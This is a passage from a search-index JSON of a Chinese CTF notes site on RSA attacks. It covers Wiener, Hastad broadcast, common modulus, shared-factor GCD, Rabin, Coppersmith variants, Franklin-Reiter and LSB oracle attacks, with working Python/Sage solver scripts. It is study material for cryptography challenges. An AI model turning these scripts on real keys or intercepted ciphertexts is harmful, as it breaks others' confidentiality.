93557434517579121 print(wienerAttack(N1,N2)) \u200b","title":"\u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb/\u4f4e\u79c1\u94a5\u6307\u6570\u653b\u51fb\uff08e\u957f\u5ea6\u8f83\u5927\uff0cd\u5c0f\uff0cWiener Attack\uff09"},{"location":"other/RSA/#hastad","text":"\u9002\u7528\u60c5\u51b5\uff1a $$n,c$$ \u4e0d\u540c\uff0c$$m,e$$ \u76f8\u540c\u3002\u4e00\u822c\u4f1a\u662f $$e=k$$\uff0c\u7136\u540e\u7ed9 $$k$$ \u7ec4\u6570\u636e\u3002 \u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002 \u4f7f\u7528\u4e0d\u540c\u7684\u6a21\u6570 $$n$$\uff0c\u76f8\u540c\u7684\u516c\u94a5\u6307\u6570 $$e$$ \u52a0\u5bc6\u76f8\u540c\u7684\u4fe1\u606f\uff0c\u5c31\u4f1a\u5f97\u5230\u591a\u4e2a $$m^e \\equiv c_i \\pmod {n_i}$$\uff0c\u5c06 $$m^e$$ \u89c6\u4e3a\u4e00\u4e2a\u6574\u4f53 $$M$$\uff0c\u8fd9\u5c31\u662f\u5178\u578b\u7684 \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406 \u9002\u7528\u60c5\u51b5\u3002\u5bb9\u6613\u6c42\u5f97 $$m^e$$ \u7684\u503c\uff0c\u5f53 $$e$$ \u8f83\u5c0f\u65f6\u76f4\u63a5\u5f00 $$e$$ \u65b9\u5373\u53ef\uff0c\u53ef\u4f7f\u7528 gmpy2.iroot(M,e) \u65b9\u6cd5\u3002 \u66f4\u4e00\u822c\u60c5\u51b5\uff08$$k$$ \u7ec4\u6570\u636e\u7684 $$N$$ \u4e0d\u540c\uff09\u89c115\u3002 #sage def chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prod chinese_remainder([3,5,7],[2,3,2]) #23 #sage crt([2,3,2],[3,5,7]) \u200b","title":"\u4f4e\u52a0\u5bc6\u6307\u6570\u5e7f\u64ad\u653b\u51fb\uff08Hastad\u653b\u51fb\uff09"},{"location":"other/RSA/#nmce","text":"\u5f53$$n$$\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\uff0c\u77e5\u9053$$n,e_1,e_2,c_1,c_2$$\u53ef\u4ee5\u5728\u4e0d\u77e5\u9053$$d_1,d_2$$\u7684\u60c5\u51b5\u4e0b\uff0c\u89e3\u51fa$$m$$\u3002 \u9996\u5148\u5047\u8bbe$$e_1,e_2$$\u4e92\u8d28, \u5373 $$\\gcd(e_1,e_2)=1$$ \u6b64\u65f6\u5219\u6709 $$e_1s_1+e_2s_2 = 1$$ \u5f0f\u4e2d\uff0c$$s_1,s_2$$\u7686\u4e3a\u6574\u6570\uff0c\u4f46\u662f\u4e00\u6b63\u4e00\u8d1f\u3002 \u901a\u8fc7\u6269\u5c55\u6b27\u51e0\u91cc\u5fb7\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8be5\u5f0f\u5b50\u7684\u4e00\u7ec4\u89e3$$\uff08s_1,s_2\uff09$$\uff0c\u5047\u8bbe$$s_1$$\u4e3a\u6b63\u6570,$$s_2$$\u4e3a\u8d1f\u6570\u3002 \u56e0\u4e3a $$c_1 = m^{e_1}\\bmod n, c_2 = m^{e_2}\\bmod n$$ \u6240\u4ee5 $$(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1}\\bmod n)^{s_1}(m^{e_2}\\bmod n)^{s_2})\\bmod n$$ \u6839\u636e\u6a21\u8fd0\u7b97\u6027\u8d28\uff0c\u53ef\u4ee5\u5316\u7b80\u4e3a $$(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1})^{s_1}(m^{e_2})^{s_2})\\bmod n$$ \u5373 $$(c_1^{s_1}c_2^{s_2})\\bmod n = (m^{e_1s_1+e_2s_2})\\bmod n$$ \u53c8\u524d\u9762\u63d0\u5230 $$e_1s_1+e_2s_2 = 1$$ \u6240\u4ee5 $$(c_1^{s_1}c_2^{s_2})\\bmod n = m\\bmod n$$ \u5373 $$c_1^{s_1}c_2^{s_2}= m$$ import gmpy2 as gp def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) n = c1 = c2 = e1 = e2 = s = egcd(e1, e2) s1 = s[1] s2 = s[2] if s1<0: s1 = - s1 c1 = gp.invert(c1, n) elif s2<0: s2 = - s2 c2 = gp.invert(c2, n) m = pow(c1,s1,n)*pow(c2,s2,n) % n print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) \u200b","title":"\u5171\u6a21\u653b\u51fb\uff08n,m\u76f8\u540c\uff0cc,e\u4e0d\u540c\uff09"},{"location":"other/RSA/#emnngcd","text":"\u9002\u7528\u60c5\u51b5\uff1a\u5b58\u5728\u4e24\u4e2a\u6216\u66f4\u591a\u6a21\u6570 \uff0c\u4e14 $$\\gcd(n_1,n_2)\\ne 1$$ \u3002 \u591a\u4e2a\u6a21\u6570 $$n$$ \u5171\u7528\u8d28\u6570\uff0c\u5219\u53ef\u4ee5\u5f88\u5bb9\u6613\u5229\u7528\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u5f97\u4ed6\u4eec\u7684\u8d28\u56e0\u6570\u4e4b\u4e00 $$\\gcd(n_1,n_2)$$\uff0c\u7136\u540e\u8fd9\u4e2a\u6700\u5927\u516c\u7ea6\u6570\u53ef\u7528\u4e8e\u5206\u89e3\u6a21\u6570\u5206\u522b\u5f97\u5230\u5bf9\u5e94\u7684 $$p$$ \u548c $$q$$\uff0c\u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002 import gmpy2 as gp n=[] for i in n: for j in n: if (i<>j): pub_p=gp.gcdext(i,j) if (pub_p[0]<>1)&(i>j): print(i) print(j) print(pub_p[0]) a=i,p=pub_p[0] q=a//p p = q = e = c = n = p*q phi = (p-1) * (q-1) d = gp.invert(e, phi) m = pow(c, d, n) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) \u200b","title":"e,m\u76f8\u540c\uff0c\u591a\u4e2an\u4e2d\u5b58\u5728\u4e24\u4e2an\u6709GCD\uff08\u6a21\u4e0d\u4e92\u7d20\uff09"},{"location":"other/RSA/#rabin","text":"\u9002\u7528\u60c5\u51b5\uff1a$$e=2$$ \u3002 \u4e00\u822c\u5148\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5206\u89e3\u5f97\u5230 $$p,q$$\uff0c\u7136\u540e\u89e3\u5bc6\u3002 \u51fd\u6570\u8fd4\u56de\u56db\u4e2a\u6570\uff0c\u8fd9\u5176\u4e2d\u53ea\u6709\u4e00\u4e2a\u662f\u6211\u4eec\u60f3\u8981\u7684\u660e\u6587\uff0c\u9700\u8981\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u9a8c\u8bc1\u3002 import gmpy2 def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) c = p = q = m = rabin_decrypt(c,p,q) for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass \u200b","title":"Rabin\u52a0\u5bc6"},{"location":"other/RSA/#boneh-and-durfee-attack","text":"$$e$$ \u975e\u5e38\u5927\u63a5\u8fd1\u4e8e$$N$$\uff0c\u5373 $$d$$ \u8f83\u5c0f\u65f6\u3002\u4e0e\u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb\u7c7b\u4f3c\uff0c\u6bd4\u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb\uff08Wiener Attack\uff09\u66f4\u5f3a\uff0c\u53ef\u4ee5\u89e3\u51b3$$\\cfrac{1}{3}N^{\\frac{1}{4}} \\leq d \\leq N^{0.292}$$\u7684\u95ee\u9898\u3002 \u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002 2k [(N + 1)/2 + (-p -q)/2] + 1 = 0 mod e Boneh and Durfee attack: f(x,y) = 1 + x * (A + y) e d = x [(N + 1)/2 + y] + 1 \u6545\uff1a x = 2k y = (-p-q)/2 \u53d8\u79cd1 \uff1a$$e$$ \u5f88\u5927\uff0c$$dp$$ \u5f88\u5c0f\uff0c\u4e14 $$d>2N^{\\beta}$$\u3002 May\u2019s Attack \u5047\u8bbe $$e<\\varphi(N),q \\le N^{\\beta},\\beta \\le \\frac{1}{2}$$\uff0c\u56e0 $$ed_p \\equiv 1 \\pmod {p-1}$$\uff0c\u6709 $$ed_p=1+k(p-1)$$\uff0c \u5bf9\u4e8e $$k \\in \\mathbb{N}$$\uff0c\u6709 $$ed_p=(k-1)(p-1)+p$$\uff0c\u5373 $$ed_pq=(k-1)(N-q)+N$$\u3002 \u8bbe $$x,y$$ \u4e3a\u53c2\u6570\uff0c\u5219\u591a\u9879\u5f0f $$f(x,y)=x(N-y)+N$$ \u5728\u6a21 $$e$$ \u4e0b\u5b58\u5728\u6839 $$(x_0,y_0)=(k-1,q)$$\uff0c\u7528coppersmith attack\u53ef\u89e3\u3002 \u200b Coppersmith\u5b9a\u7406\u6307\u51fa\u5728\u4e00\u4e2a $$e$$ \u9636\u7684 $$\\bmod n$$ \u591a\u9879\u5f0f $$f(x)$$ \u4e2d\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u6839\u5c0f\u4e8e $$n^{\\frac{1}{e}}$$\uff0c\u5c31\u53ef\u4ee5\u8fd0\u7528\u4e00\u4e2a $$O(\\log n)$$ \u7684\u7b97\u6cd5\u6c42\u51fa\u8fd9\u4e9b\u6839\u3002","title":"Boneh and Durfee attack"},{"location":"other/RSA/#coppersmithp","text":"\u77e5\u9053 $$p$$ \u7684\u9ad8\u4f4d\u4e3a $$p$$ \u7684\u4f4d\u6570\u7684\u7ea6$$\\frac12$$\u65f6\u5373\u53ef\u3002 #Sage from sage.all import * n = p4 = #p\u53bb0\u7684\u5269\u4f59\u4f4d e = pbits = 1024 kbits = pbits - p4.nbits() print(p4.nbits()) p4 = p4 << kbits PR.<x> = PolynomialRing(Zmod(n)) f = x + p4 roots = f.small_roots(X=2^kbits, beta=0.4) #\u7ecf\u8fc7\u4ee5\u4e0a\u4e00\u4e9b\u51fd\u6570\u5904\u7406\u540e\uff0cn\u548cp\u5df2\u7ecf\u88ab\u8f6c\u5316\u4e3a10\u8fdb\u5236 if roots: p = p4+int(roots[0]) print(\"n: \"+str(n)) print(\"p: \"+str(p)) print(\"q: \"+str(n//p)) \u200b","title":"Coppersmith\u653b\u51fb\uff08\u5df2\u77e5p\u7684\u9ad8\u4f4d\u653b\u51fb\uff09"},{"location":"other/RSA/#coppersmithm","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f $$m$$\uff0c\u5982\u4e0b $$C\\equiv m^e \\bmod N$$ \u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f $$m$$ \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206 $$m_0$$\uff0c\u5373 $$m=m_0+x$$\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 $$x$$\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4e0d\u77e5\u9053\u7684 $$x$$ \u5176\u5b9e\u5c31\u662f\u591a\u9879\u5f0f\u7684\u6839\uff0c\u9700\u8981\u6ee1\u8db3 Coppersmith \u7684\u7ea6\u675f\u3002 \u53ef\u4ee5\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002 $$e$$ \u8db3\u591f\u5c0f\uff0c\u4e14\u90e8\u5206\u660e\u6587\u6cc4\u9732\u65f6\uff0c\u53ef\u4ee5\u91c7\u7528Coppersmith\u5355\u53d8\u91cf\u6a21\u7b49\u5f0f\u7684\u653b\u51fb\uff0c\u5982\u4e0b\uff1a $$c=m^{e}\\bmod n=(mbar+x_{0})^{e}\\bmod n$$\uff0c\u5176\u4e2d $$mbar = (m >> k\\text{bits}) << k\\text{bits}$$ \u5f53 $$\\vert x_{0}\\vert\\leq N^{\\frac{1}{e}}$$ \u65f6\uff0c\u53ef\u4ee5\u5728 $$\\log N$$ \u548c $$e$$ \u7684\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u6c42\u51fa $$x_0$$\u3002 #Sage n = e = c = mbar = kbits = beta = 1 nbits = n.nbits() print(\"upper {} bits of {} bits is given\".format(nbits - kbits, nbits)) PR.<x> = PolynomialRing(Zmod(n)) f = (mbar + x)^e - c x0 = f.small_roots(X=2^kbits, beta=1)[0] # find root < 2^kbits with factor = n print(\"m:\", mbar + x0) \u200b","title":"Coppersmith\u653b\u51fb\uff08\u5df2\u77e5m\u7684\u9ad8\u4f4d\u653b\u51fb\uff09"},{"location":"other/RSA/#coppersmithd","text":"\u5982\u679c\u77e5\u9053 $$d$$ \u7684\u4f4e\u4f4d\uff0c\u4f4e\u4f4d\u7ea6\u4e3a $$n$$ \u7684\u4f4d\u6570\u7684 $$\\frac14$$ \uff08$$\\frac{n.n\\text{bits}()}{4}$$\uff09\u5c31\u53ef\u4ee5\u6062\u590d $$d$$\u3002 #Sage def partial_p(p0, kbits, n): PR.<x> = PolynomialRing(Zmod(n)) nbits = n.nbits() f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.4) # find root < 2^(nbits//2-kbits) with factor >= n^0.4 if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p) def find_p(d0, kbits, e, n): X = var('X') for k in range(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p and p != 1: return p if __name__ == '__main__': n = e = c = d0 = beta = 0.5 nbits = n.nbits() kbits = d0.nbits() print(\"lower %d bits (of %d bits) is given\" % (kbits, nbits)) p = int(find_p(d0, kbits, e, n)) print(\"found p: %d\" % p) q = n//int(p) print(\"d:\", inverse_mod(e, (p-1)*(q-1))) \u53d8\u79cd1 \uff1a$$n=p\\cdot q\\cdot r$$\uff0c\u5df2\u77e5 $$n,p,d=\\text{inv}(e,\\varphi(n)),e,c$$ $$k(p-1)\\rightarrow k\u2019,qr\\rightarrow n\u2019,q+r\\rightarrow s$$ $$ed_{0}\\equiv 1+k\u2019(n\u2019-s+1) \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (1)$$ $$q^{2}-sq+n\u2019\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (2)$$ \u8054\u7acb\u53ef\u5f97\uff0c$$(ed_{0}-1-k\u2019n\u2019-k\u2019)q+k\u2019q^{2}+k\u2019n\u2019\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}$$ \u5373\u6c42\u89e3\u540c\u4f59\u65b9\u7a0b\u53ef\u5f97 $$q$$ \u7684\u4f4e $$size(d0)$$ \u4f4d\uff0c\u672c\u6765\u662f\u4e2apartial d\u7684coppersmith\u95ee\u9898\uff0c\u4f46\u56e0\u4e3astep1\u6c42\u89e3\u540c\u4f59\u65b9\u7a0b\u540e\u5f97\u5230\u7684 $$q$$ \u5df2\u662f\u5b8c\u6574\u7684 $$q$$\uff0c\u6240\u4ee5\u65e0\u9700\u540e\u7eed\u7684coppersmith\u3002 \u53c2\u8003\uff1a Dragon CTF 2019 - RSA Chained #Sage def find_p(d0, kbits, e, n, p): X = var('X') for k in range(1, e + 1): k_dot = k * (p - 1) results = solve_mod([e * d0 * X - k_dot * X * (n - X + 1) + k_dot * n == X], 2^kbits) for x in results: q = ZZ(x[0]) if n % q == 0: return q return None n = ... # q * r p = c = d0 = e = kbits = d0.nbits() q = find_p(d0, kbits, e, n, p) phi = (p - 1) * (q - 1) * (n // q - 1) d = inverse_mod(e, phi) print(bytes.fromhex(hex(pow(c, d, p * n))[2:])) \u200b","title":"Coppersmith\u653b\u51fb\uff08\u5df2\u77e5d\u7684\u4f4e\u4f4d\u653b\u51fb\uff09"},{"location":"other/RSA/#coppersmithnp","text":"\u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 $$N$$ \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 $$N$$\u3002 \u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002 \u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801\uff1a beta = 0.5 dd = f.degree() epsilon = beta / 7 mm = ceil(beta**2 / (dd * epsilon)) tt = floor(dd * mm * ((1/beta) - 1)) XX = ceil(N**((beta**2/dd) - epsilon)) + 1000000000000000000000000000000000 roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX) \u5176\u4e2d\uff0c \u5fc5\u987b\u6ee1\u8db3 $$q\\ge N^{beta}$$\uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86 $$beta=0.5$$\uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002 XX \u662f $$f(x)=q\u2032+x$$ \u5728\u6a21 $$q$$ \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684 $$q\u2032$$ \u4e0e\u56e0\u6570 $$q$$ \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002 #Sage n = e = c = pbar = kbits = print(\"upper %d bits (of %d bits) is given\" % (pbar.nbits()-kbits, pbar.nbits())) PR.<x> = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root < 2^kbits with factor >= n^0.4 p = x0 + pbar print(\"p:\", p) q = n // int(p) d = inverse_mod(e, (p-1)*(q-1)) print(\"m:\", pow(c, d, n)) \u6ce8\uff1a sage\u7684small_root\u4f20\u53c2 X \u4e0d\u80fd\u8fc7\u5927\uff0c\u9700\u81ea\u884c\u5224\u65ad\u9608\u503c\u5e76\u8c03\u6574\uff08\u5982\u679cX\u8fc7\u5927\uff0c\u5373\u4f7f\u5b58\u5728X\u5185\u7684\u89e3\uff0c\u4e5f\u65e0\u6cd5\u6c42\u51fa\uff09\uff1b \u6bd4\u5982 $$p$$ \u7684\u4f4e\u4f4d\u6cc4\u9732\u65f6\u56e0\u4e3a\u4e0d\u786e\u5b9a\u7f3a\u5931\u9ad8\u4f4d\u7684\u5177\u4f53\u6bd4\u7279\u6570\uff0c\u6240\u4ee5\u8981\u5728 $$2^{\\frac{n.n\\text{bits}()}{2}\u2212k\\text{bits}}$$ \u9644\u8fd1\u4f5cX\u7684\u9608\u503c\u4f30\u8ba1\uff1b \u65e0\u6cd5\u786e\u5b9a\u62ff\u5230\u7684 $$p$$ \u662f\u5426\u5927\u4e8e $$q$$\uff0c\u6240\u4ee5\u5bf9 $$\\beta=0.5$$ \u8fdb\u884c\u8c03\u6574\u81f3 $$0.4$$\u3002 \u200b","title":"Coppersmith\u653b\u51fb\uff08\u5df2\u77e5N\u4e00\u4e2a\u56e0\u5b50\u7684\u9ad8\u4f4d\uff0c\u90e8\u5206p\uff09"},{"location":"other/RSA/#coppersmiths-short-pad-attack-related-message-attackfranklin-reiter","text":"\u76ee\u524d\u5728\u5927\u90e8\u5206\u6d88\u606f\u52a0\u5bc6\u4e4b\u524d\u90fd\u4f1a\u8fdb\u884c padding\uff0c\u4f46\u662f\u5982\u679c padding \u7684\u957f\u5ea6\u8fc7\u77ed\uff08$$m \\in (0,\\lfloor\\frac{n.n\\text{bits}()}{e^2}\\rfloor]$$\uff09\uff0c\u4e5f\u6709 \u53ef\u80fd \u88ab\u5f88\u5bb9\u6613\u5730\u653b\u51fb\u3002 \u8fd9\u91cc\u6240\u8c13 padding \u8fc7\u77ed\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u5e94\u7684\u591a\u9879\u5f0f\u7684\u6839\u4f1a\u8fc7\u5c0f\u3002 \u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f $$M_1$$ \u4e0e $$M_2$$ \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f $$C_1$$\uff0c$$C_2$$ \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f $$M_1$$ \u4e0e $$M_2$$ \u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a $$N$$\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b\uff1a $$M_1 \\equiv f(M_2) \\bmod N$$ \u5176\u4e2d $$f$$ \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4 $$f=ax+b$$\u3002 \u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a $$O(e\\log^2N)$$\u3002 \u8fd9\u4e00\u653b\u51fb\u7531 Franklin\u4e0eReiter \u63d0\u51fa\u3002 #\u811a\u672c1 #Sage import binascii def attack(c1, c2, n, e): PR.<x>=PolynomialRing(Zmod(n)) # replace a,b,c,d g1 = (a*x+b)^e - c1 g2 = (c*x+d)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0] c1 = c2 = n = e = m1 = attack(c1, c2, n, e) print(binascii.unhexlify(\"%x\" % int(m1))) #\u811a\u672c2 #Sage def short_pad_attack(c1, c2, e, n): PRxy.<x,y> = PolynomialRing(Zmod(n)) PRx.<xn> = PolynomialRing(Zmod(n)) PRZZ.<xz,yz> = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] # find root < 2^kbits with factor >= n^0.4 return diff def related_message_attack(c1, c2, diff, e, n): PRx.<x> = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0] if __name__ == '__main__': n = e = c1 = c2 = diff = short_pad_attack(c1, c2, e, n) print(\"difference of two messages is %d\" % diff) m1 = related_message_attack(c1, c2, diff, e, n) print(\"m1:\", m1) print(\"m2:\", m1 + diff) \u200b","title":"Coppersmith\u2019s Short-pad Attack &amp; Related Message Attack\uff08Franklin-Reiter\u653b\u51fb\uff09"},{"location":"other/RSA/#rsa-hastad-attack-with-non-linear-padding-and-different-public-keyspadding","text":"\u9002\u7528\u60c5\u51b5\uff1a$$m$$ \u7ecf $$k$$ \u6b21\u975e\u7ebf\u6027padding\u5904\u7406\u540e\uff0c\u5206\u522b\u7528 $$k$$ \u7ec4 $$(N_i,e_i)$$ \u52a0\u5bc6\u540e\u5f97 $$k$$ \u7ec4 $$c_i$$\u3002 \u53c2\u8003\uff1a2020\u5e74\u7f8a\u57ce\u676f - Invitation #Sage #e=3, padding: m\u00b2+(3^431)k def linearPaddingHastads(cArray,nArray,aArray,bArray,eArray,eps): if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == len(eArray)): for i in range(4): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) aArray[i] = Integer(aArray[i]) bArray[i] = Integer(bArray[i]) eArray[i] = Integer(eArray[i]) TArray = [-1]*4 for i in range(4): arrayToCRT = [0]*4 arrayToCRT[i] = 1 TArray[i] = crt(arrayToCRT,nArray) P.<x> = PolynomialRing(Zmod(prod(nArray))) gArray = [-1]*4 for i in range(4): gArray[i] = TArray[i]*(pow(aArray[i]*x**2 + bArray[i],eArray[i]) - cArray[i]) g = sum(gArray) g = g.monic() roots = g.small_roots(epsilon=eps) if(len(roots)== 0): print(\"No Solutions found!\") return -1 return roots else: print(\"Input error!\") def nonLinearPadding(): eArr = [3 for i in range(4)] nArr = [146694460234280339612721415368435987068740712812770728817136582256341063038147863645902264969297892447333024201649306207442798919845916187823646745721109151386096190207317810424580842120750075213595282979568495342617919336417068886973047979116994072272482630372638964064972815256237040541007947708358680368391,65031485534704406281490718325237831433086480239135617407356760819741796565231283220528137697949585150709734732370203390254643835828984376427852793969716489016520923272675090536677771074867975287284694860155903327351119710765174437247599498342292671117884858621418276613385329637307269711179183430246951756029,126172075578367446151297289668746433680600889845504078949758568698284471307000358407453139846282095477016675769468273204536898117467559575203458221600341760844973676129445394999861380625435418853474246813202182316736885441120197888145039130477114127079444939102267586634051045795627433724810346460217871661901,75691424835079457343374072990750986689075078863640186724151061449621926239051140991748483370587430224317778303489124525034113533087612981452189061743589227565099659070008017454957304620495920813121234552401715857719372861565651204968408267740732475458128601061676264465241188491988485848198323410127587280471] cArr = [129274519334082165644106292383763271862424981496822335330342328217347928093592453953990448827969549377883054831490973006383371688359344675312001881631556371220779971357039899721241880304156884612458373310254854821837978876725801047977081900824202659636258168216028784656056334358157381820784576207338479493823,8140023566779187828652447593867705813386781164538611122714708931585587727699213769519135028841126072130625547328311301696554048174772606261707345115571968105138543476580875347239912760797035694220505996377127309341770427102697008350472060971360460756799310951343070384766137332401117333917901167639276168214,25434511525127530194830986592289179576070740435049947678930286998924519588985583799757299734846614343604661534391991096353170465467791358514448923161460366596251448937540153262731348684727026598527904328268639060306102090278287818149679940661579357649191023269947102746200467430583428889484549034314463114080,9435583236354598287661880148272717764447540972316605192855157484524753847806158586224733743434644389385148450722945845355791145016665856388503878165725148745517696840251674049929524448078129458846254866804153080766917319923905682824180976106679633180818527967145571143203594244851742143986040226240019541346] aArr = [1 for i in range(4)] bArr = [i * 3 ** 431 for i in [3,8,10,11]] msg = linearPaddingHastads(cArr,nArr,aArr,bArr,eArr,eps=1/20) for i in msg: print(bytes.fromhex(hex(i)[2:])) if __name__ == '__main__': nonLinearPadding() \u200b","title":"RSA Hastad Attack with non-linear padding and different public keys\uff08\u5e26\u975e\u7ebf\u6027padding\u548c\u4e0d\u540c\u516c\u94a5\u7684\u5e7f\u64ad\u653b\u51fb\uff09"},{"location":"other/RSA/#least-significant-bit-oracle-attack-lsb-oracle-attack-parity-oracle","text":"\u9002\u7528\u60c5\u51b5\uff1a\u53ef\u4ee5\u9009\u62e9\u5bc6\u6587\u5e76\u6cc4\u9732\u660e\u6587\u7684\u6700\u4f4e\u4f4d\uff08\u5947\u5076\u6027\uff09\u3002 \u5047\u8bbe\u5b58\u5728\u4e00\u4e2aoracle\uff0c\u80fd\u5bf9\u7ed9\u5b9a\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\u5e76\u7ed9\u51fa\u5bf9\u5e94\u660e\u6587\u7684\u5947\u5076\u4fe1\u606f\uff0c\u5219\u6211\u4eec\u53ea\u9700\u8981 $$\\log(N)$$ \u6b21\u5c31\u80fd\u89e3\u5bc6\u4efb\u610f\u5bc6\u6587\u3002 \u5728\u4e00\u6b21RSA\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u4e3a $$m$$\uff0c\u6a21\u6570\u4e3a $$n$$\uff0c\u52a0\u5bc6\u6307\u6570\u4e3a $$e$$\uff0c\u5bc6\u6587\u4e3a $$c$$\u3002\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u51fa $$c\u2019=((2^e)\\cdot c)\\%n=((2^e)\\cdot(m^e))\\%n=((2\\cdot m)^e)\\%n$$ \uff0c \u56e0\u4e3a $$m$$ \u7684\u4e24\u500d\u53ef\u80fd\u5927\u4e8e $$n$$\uff0c\u6240\u4ee5\u7ecf\u8fc7\u89e3\u5bc6\u5f97\u5230\u7684\u660e\u6587\u662f $$m\u2019=(2\\cdot m)\\%n$$ \u3002 \u6211\u4eec\u8fd8\u80fd\u591f\u77e5\u9053 